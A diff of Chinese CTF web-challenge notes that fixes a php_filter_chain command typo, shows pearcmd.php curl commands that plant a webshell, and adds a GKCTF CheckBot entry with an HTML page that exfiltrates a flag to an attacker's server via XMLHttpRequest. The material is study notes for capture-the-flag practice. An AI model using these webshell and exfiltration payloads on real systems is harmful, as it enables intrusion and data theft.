@@ -1439,7 +1439,7 @@ process.mainModule.require("express").response.send=function(){this.end(process.
 include $_REQUEST['file'];
 ```
 
-当可以完全控制require/include的文件名时，就能使用[脚本](https://github.com/synacktiv/php_filter_chain_generator)获取rce payload:`python3 filter_chain.py — chain '<?php system("cat /flag.txt");?>'`.或者使用pearcmd.php上传木马getshell。
+当可以完全控制require/include的文件名时，就能使用[脚本](https://github.com/synacktiv/php_filter_chain_generator)获取rce payload:`python3 filter_chain.py —-chain '<?php system("cat /flag.txt");?>'`.或者使用pearcmd.php上传木马getshell。
 ```
 curl "http://example.com/?page=/usr/local/lib/php/pearcmd&+-c+/tmp/webshell.php+-d+man_dir=<?echo(system(\$_GET\['cmd'\]));?>+-s+"
 curl "http://example.com/?page=/tmp/webshell&cmd=cat+/flag.txt"
@@ -1875,6 +1875,7 @@ def profile():
 ```
 
 该段代码检查访问时是否已有缓存，如果有就直接返回缓存。但`current_user.username.lower()`将任意username全部转为小写。如果注册时不要求统一小写，缓存时却要求，可能导致缓存被投毒。攻击者可注册诸如`ADMIN`的账户，在缓存里存入恶意payload。由于大小写不敏感，真正的admin用户访问自己的缓存时也会出现恶意payload，有xss的风险。
+
 215. [Simple Notes](https://mizu.re/post/simple-notes)
 - CORS misconfiguration
 ```
@@ -1977,3 +1978,21 @@ ${dwf.newInstance(ec,null)("cmd")}
   - HEAD文件
   - config文件（也是插入payload的地方）
   - objects和refs文件夹。这两个文件夹可以是空的，但是必须要有
+221. [[GKCTF 2021]CheckBot](https://blog.csdn.net/cjdgg/article/details/121504021)
+- xss（或者csrf？）假设可以将任意url发送给admin bot，以下为本地服务器部署的提取flag的html。
+```html
+<html>
+        <body>
+                <iframe id="flag" src="想要admin访问的有flag的url"></iframe>
+                <script>
+                        window.onload = function(){
+                        let flag = document.getElementById("flag").contentWindow.document.getElementById("flag").innerHTML;
+                        var exportFlag = new XMLHttpRequest();
+                        exportFlag.open('get', '公网ip服务器url/flagis-' + window.btoa(flag));
+                        exportFlag.send();
+                        }
+                </script>
+        </body>
+</html>
+```
+提交给admin bot的url为部署以上代码的公网url。
